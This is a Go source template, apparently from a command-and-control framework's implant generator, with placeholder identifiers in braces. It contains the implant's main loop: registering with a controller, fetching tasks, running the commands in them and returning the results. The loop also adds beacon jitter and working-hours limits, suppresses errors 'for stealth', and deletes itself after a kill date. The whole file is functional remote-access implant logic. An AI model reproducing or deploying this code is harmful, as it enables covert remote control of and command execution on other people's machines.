func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
	for {
		// Check kill date first
		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return
		}

		err := a.{AGENT_REGISTER_FUNC}()
		if err == nil {
			a.{AGENT_RESET_FAIL_COUNT_FUNC}()
			break
		} else {
			if !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
			}
		}
		time.Sleep(30 * time.Second)
	}

	a.{AGENT_RUNNING_FIELD} = true
	checkCount := 0

	for a.{AGENT_RUNNING_FIELD} {
		// Check kill date on each iteration
		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return
		}

		// Check if we're outside working hours
		if !a.{AGENT_CHECK_WORKING_HOURS_FUNC}() {
			// Sleep for 5 minutes and check again
			time.Sleep(5 * time.Minute)
			continue
		}

		// Check interactive status on every iteration to ensure immediate mode switching
		shouldBeInteractive, err := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
		if err == nil {
			if shouldBeInteractive && !a.{AGENT_INTERACTIVE_MODE_FIELD} {
				// Enter interactive mode
				a.{AGENT_INTERACTIVE_MODE_FIELD} = true
				// Start dedicated interactive polling
				go a.{AGENT_START_INTERACTIVE_POLLING_FUNC}()
			} else if !shouldBeInteractive && a.{AGENT_INTERACTIVE_MODE_FIELD} {
				// Exit interactive mode
				// Stop dedicated interactive polling first
				a.{AGENT_STOP_INTERACTIVE_POLLING_FUNC}()
				a.{AGENT_INTERACTIVE_MODE_FIELD} = false
			}
		} else {
			_ = err // Use the error variable to avoid unused variable warning
		}

		// If not in interactive mode, handle regular tasks
		if !a.{AGENT_INTERACTIVE_MODE_FIELD} {
			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
			if err != nil {
				// Failed to get tasks, but don't print anything for stealth
				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				time.Sleep(30 * time.Second)
				continue
			} else {
				a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful communication
			}


			for _, task := range tasks {
				result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
				taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
				if err != nil {
					// Failed to submit task result, but don't print anything for stealth
					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				} else {
					a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful result submission
				}
			}

			// In regular mode, use profile-defined heartbeat and jitter
			baseSleep := float64(a.{AGENT_HEARTBEAT_INTERVAL_FIELD})
			jitterFactor := (rand.Float64() - 0.5) * 2 * a.{AGENT_JITTER_FIELD}
			sleepTime := baseSleep * (1 + jitterFactor)
			if sleepTime < 5 {
				sleepTime = 5
			}

			time.Sleep(time.Duration(sleepTime) * time.Second)
		} else {
			// In interactive mode, we rely on the dedicated polling goroutine
			// Sleep for a short time to avoid busy-waiting
			time.Sleep(1 * time.Second)
		}

		checkCount++
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_STOP_FUNC}() {
	a.{AGENT_RUNNING_FIELD} = false
	// Stop interactive polling if running
	if a.{AGENT_INTERACTIVE_MODE_FIELD} {
		a.{AGENT_STOP_INTERACTIVE_POLLING_FUNC}()
	}
}